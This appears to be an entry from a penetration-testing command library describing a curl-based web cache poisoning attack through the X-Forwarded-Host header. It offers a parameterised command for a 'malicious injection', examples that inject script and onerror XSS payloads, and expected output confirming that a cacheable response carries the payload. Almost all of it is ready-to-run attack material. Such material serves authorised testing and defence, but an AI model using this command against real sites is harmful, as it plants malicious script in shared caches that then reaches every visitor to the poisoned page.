---
id: fd516d0b-1ad9-4bac-bf9e-71e5201c1e04
name: curl-cache-poisoning-x-forwarded-host
type: command
executor: bash
data: >-
  curl -X GET "http://$_TARGET_URL?buster=$BUSTER_PARAM" -H "Host:
  $_TARGET_DOMAIN" -H "X-Forwarded-Host: $_POISON_PAYLOAD" -v
output: null
created_at: '2023-04-06T03:56:41.273135+00:00'
updated_at: '2023-04-06T03:56:41.280667+00:00'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - web
  - cache-poisoning
verified: true
validated: true
---

# curl-cache-poisoning-x-forwarded-host

## Command

```bash
curl -X GET "http://$_TARGET_URL?buster=$BUSTER_PARAM" \
  -H "Host: $_TARGET_DOMAIN" \
  -H "X-Forwarded-Host: $_POISON_PAYLOAD" \
  -v
```

## Description

This command uses curl to send a crafted HTTP GET request to poison a web cache via the X-Forwarded-Host header. It appends a buster parameter to isolate the cache entry and injects a payload into the header, causing the cached response to include malicious content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | The target endpoint URL (e.g., /test) | Yes |
| $BUSTER_PARAM | Unique parameter to bust cache (e.g., 123) | Yes |
| $_TARGET_DOMAIN | The Host header domain (e.g., target.com) | Yes |
| $_POISON_PAYLOAD | Malicious injection (e.g., test"><script>alert(1)</script>) | Yes |
| -X GET | Specifies HTTP method | Built-in |
| -H | Adds custom headers | Built-in |
| -v | Verbose output for debugging | Built-in |

## Examples

### Basic Usage

```bash
curl -X GET "http://example.com/test?buster=123" \
  -H "Host: example.com" \
  -H "X-Forwarded-Host: test'><script>alert(1)</script>" \
  -v
```

### Advanced Usage

```bash
curl -X GET "https://target.com/resource?buster=$(date +%s)" \
  -H "Host: target.com" \
  -H "X-Forwarded-Host: malicious.com'><img src=x onerror=alert(1)>" \
  -H "User-Agent: PoisonTest" \
  -v
```

## Expected Output

Verbose curl output showing the request and response, including:

* Connected to target.com
* > GET /test?buster=123 HTTP/1.1
* > Host: target.com
* > X-Forwarded-Host: test"><script>alert(1)</script>
* < HTTP/1.1 200 OK
* < Cache-Control: public, max-age=3600
* Response body containing the injected payload, e.g., <meta property="og:image" content="https://test"><script>alert(1)</script>">

Success is indicated by the payload appearing in the response body and caching headers present.

## Related

- [[procedures/Web-Cache-Deception-Unkeyed-Input-Cache-Poisoning]]
